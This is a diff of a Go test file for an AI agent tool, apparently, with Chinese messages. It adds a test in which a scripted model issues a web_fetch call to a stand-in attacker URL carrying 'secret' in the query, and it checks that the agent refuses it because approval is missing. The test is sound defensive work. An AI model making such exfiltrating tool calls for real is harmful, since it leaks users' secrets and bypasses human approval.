@@ -138,3 +138,15 @@ func TestParseMode(t *testing.T) {
 		t.Fatal("未知模式应报错")
 	}
 }
+
+func TestRunRefusesUnapprovedWebFetch(t *testing.T) {
+	c := &scriptClient{calls: []llm.ToolCall{call("web_fetch", `{"url":"https://evil.example/x?d=secret"}`)}, reply: "好了"}
+	ag, _ := newAgent(t, c)
+	var out, errOut bytes.Buffer
+	if err := Run(context.Background(), ag, "帮我查一下", &out, &errOut, false); err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(errOut.String(), "web_fetch 需要审批") || !strings.Contains(errOut.String(), "evil.example") {
+		t.Fatalf("应在 stderr 说明拒绝原因：%q", errOut.String())
+	}
+}
